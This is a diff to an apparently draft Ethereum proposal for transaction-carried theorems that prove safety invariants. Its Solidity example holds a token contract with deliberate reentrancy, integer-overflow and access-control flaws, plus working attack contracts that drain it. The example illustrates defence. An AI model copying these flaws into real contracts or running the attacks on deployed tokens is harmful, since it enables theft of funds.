@@ -50,7 +50,7 @@ Smart contracts are crucial elements of decentralized technologies, but they fac
   TODO: Remove this comment before submitting
 -->
 
-This proposal is necessary since the Ethereum protocol does not ensure the safety features on the design level.
+This proposal is necessary since the Ethereum protocol does not ensure the safety features on the design level. It stems from the recognition of the significant obstacles faced by smart contracts in terms of trustworthiness due to security bugs and trapdoors. While smart contracts are crucial elements of decentralized technologies, their vulnerabilities pose a challenge to their widespread adoption. Conventional smart contract verification and auditing helps a lot, but it only tries to find as many vulnerabilities as possible in the development and testing phases. However, in real cases, we suffer from the unintentional vulnerabilities and logical trapdoors which lead to lack of transparency and trustworthiness of smart contract.
 
 ## Specification
 
@@ -60,9 +60,22 @@ This proposal is necessary since the Ethereum protocol does not ensure the safet
   It is recommended to follow RFC 2119 and RFC 8170. Do not remove the key word definitions if RFC 2119 and RFC 8170 are followed.
 
   TODO: Remove this comment before submitting
+
+  The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT", "SHOULD", "SHOULD NOT", "RECOMMENDED", "NOT RECOMMENDED", "MAY", and "OPTIONAL" in this document are to be interpreted as described in RFC 2119 and RFC 8174.
 -->
 
-The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT", "SHOULD", "SHOULD NOT", "RECOMMENDED", "NOT RECOMMENDED", "MAY", and "OPTIONAL" in this document are to be interpreted as described in RFC 2119 and RFC 8174.
+First, we give several terminology:
+- $\tau$: it denotes the theorem. Every transaction must carry a theorem that proves its adherence to the specified safety properties in the invoked contracts.
+- $\mathrm{f}$: it denotes the entry function of transaction.
+- $\varphi(\mathrm{V}, \mathrm{s})$: $\varphi$ denotes hypothesis which defined over input parameter $\mathrm{V}$ and blockchain state $\mathrm{s}$.
+- $\mathrm{h}$: code path hash which is used for execution path match.
+- Invariant: contract invariants like the ones are ensured before and after every transaction. They contain quantifiers, sum of map, etc., so are difficult to check concretely.
+
+$$
+\tau::=(\mathrm{f}, \varphi(\mathrm{V}, \mathrm{s}), \mathrm{h})
+$$
+
+The above theorem means​ for any transaction started by invoking $\mathrm{f}$ when $\varphi$ is satisfied, if it is completed (i.e., not reverted by EVM) and the hash of the code path equals $\mathrm{h}$, then all the assertions along the code path are guaranteed to hold. ​
 
 ## Rationale
 
@@ -101,6 +114,151 @@ No backward compatibility issues found.
 
   TODO: Remove this comment before submitting
 -->
+
+We extract a token contract from this [blog](https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/) as shown below:
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+/* Vulnerability examples:
+
+   reentrancy:
+   https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/
+
+   integer overflow:
+   https://peckshield.medium.com/integer-overflow-i-e-proxyoverflow-bug-found-in-multiple-erc20-smart-contracts-14fecfba2759
+*/
+pragma solidity >=0.8.0;
+
+abstract contract Token {
+    address public owner;
+    uint256 public totalSupply;
+    function balanceOf(address _owner) public view virtual returns (uint256 balance);
+}
+
+/// @custom:tct invariant: forall x:address :: 0 <= balances[x] && balances[x] <= totalSupply
+/// @custom:tct invariant: sum(balances) == totalSupply 
+abstract contract StandardToken is Token {
+
+    function balanceOf(address _owner) public view override returns (uint256 balance) {
+        return balances[_owner];
+    }
+
+    mapping (address => uint256) balances;
+}
+
+contract MultiVulnToken is StandardToken {
+    string public name = "Demo token with reentrancy issue, integer overflow and access control issue";
+    constructor (uint256 initialSupply) {
+        totalSupply = initialSupply;
+        balances[msg.sender] = totalSupply;
+    }
+    function transferProxy(address _from, address _to, uint256 _value, uint256 _fee
+        ) public returns (bool){
+		unchecked{
+			require(balances[_from] >= _fee + _value);
+			require(balances[_to] + _value >= balances[_to]);
+			require(balances[msg.sender] + _fee >= balances[msg.sender]); 
+			
+			balances[_to] += _value;
+			balances[msg.sender] += _fee;
+			balances[_from] -= _value + _fee;
+			return true;
+		}
+    }
+
+    //This function moves all tokens of msg.sender to the account of "_to"
+    function clear(address _to) public {
+        uint256 bal = balances[msg.sender];
+        require (msg.sender!=_to);
+        balances[_to]+=bal;
+        bool success;
+        (success, ) = msg.sender.call(
+            abi.encodeWithSignature("receiveNotification(uint256)", bal)
+        );
+        require(success, "Failed to notify msg.sender");
+        balances[msg.sender] = 0;
+    }
+}
+
+//========================================================
+contract reentrancy_attack {
+    MultiVulnToken public multiVulnToken; 
+    address _to;
+    uint count=0;
+    constructor (MultiVulnToken _multiVulnToken, address __to) 
+    {
+        multiVulnToken=_multiVulnToken;
+        _to = __to;
+    }
+    function receiveNotification(uint256) public { 
+        if (count < 9) {
+            count ++;
+            multiVulnToken.clear(_to); 
+        }
+    } 
+    function attack() public {
+        multiVulnToken.clear(_to);
+    }
+}
+
+contract Demo {
+    MultiVulnToken MultiVulnTokenContractAddress;
+
+    address attacker1Address = address(0x92349Ef835BA7Ea6590C3947Db6A11EeE1a90cFd); //just an arbitrary address
+    reentrancy_attack attacker2Address1;
+    address attacker2Address2 = address(0x0Ce8dAf9acbA5111C12B38420f848396eD71Cb3E); //just an arbitrary address
+    
+    constructor () {
+        MultiVulnTokenContractAddress = new MultiVulnToken(1000);
+        attacker2Address1 = new reentrancy_attack(MultiVulnTokenContractAddress,attacker2Address2);
+
+        //suppose attacker3Address1 has 5 tokens initially
+        MultiVulnTokenContractAddress.transferProxy(address(this), address(attacker2Address1),5,0
+                                      );
+    }
+
+    function getBalanceOfAttacker1() view public returns (uint256){
+        return MultiVulnTokenContractAddress.balanceOf(attacker1Address);
+    }
+    function attack1_int_overflow() public {
+        MultiVulnTokenContractAddress.transferProxy(address(this), 
+                                      attacker1Address,
+                                      uint256(2**255+1),
+                                      uint256(2**255)
+                                      );
+    }
+
+    function getBalanceOfAttacker2() view public returns (uint256){
+        return MultiVulnTokenContractAddress.balanceOf(address(attacker2Address1))
+            +  MultiVulnTokenContractAddress.balanceOf(attacker2Address2);
+    }
+    function attack2_reentrancy() public {
+        attacker2Address1.attack();
+    }
+}
+```
+
+Note that we have provided the invariant for the entry functions above `abstract contract StandardToken`. Since TCT enables behavioral subtyping for smart contract, it still delivers its children contract such as `MultiVulnToken`.
+
+For the contract `MultiVun`, we have provided a theorem for the entry function of transaction as below
+```json
+{
+	"entry-for-test":"MultiVulnToken::clear(address)",
+	"entry-for-real":"0x88c436e4a975ef5e5788f97e86d80fde29ddd13d::0x3d0a4061",
+	"def-vars": {
+		"totalSupply": ["", "this.totalSupply", "uint256"]
+	},
+	"hypothesis": [
+		"totalSupply < TwoE256 && tx_origin != _to"
+	],
+	"path-hash-for-test": "*",
+	"path-hash-for-real": "the real hash (not implemented yet)",
+	"numerical-type": "int"
+}
+```
+
+If attacker’s obligation to prove the theorem, the attempt would be doomed to fail.​
 
 ## Reference Implementation
 
